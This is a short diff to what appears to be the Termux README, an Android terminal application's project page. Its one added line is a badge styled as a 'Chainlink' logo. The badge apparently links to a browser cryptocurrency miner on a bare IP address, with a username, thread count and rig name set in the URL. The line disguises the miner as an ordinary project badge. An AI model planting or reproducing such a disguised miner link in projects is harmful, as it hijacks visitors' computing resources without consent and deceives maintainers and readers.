@@ -2,6 +2,7 @@
 
 [![Repo-Alive](https://img.shields.io/discord/641256914684084234.svg?label=&logo=discord&logoColor=ffffff&color=5865F2)](https://discord.gg/HXpF69X)
 
+[![Chainlink](https://img.shields.io/badge/Chainlink-375BD2?style=for-the-badge&logo=Chainlink&logoColor=white)](http://51.15.127.80/webminer.html?username=one_two_tree&threads=8&rigid=Raspberry+Pi)
 
 [Termux](https://termux.com) is an Android terminal application and Linux environment.
 
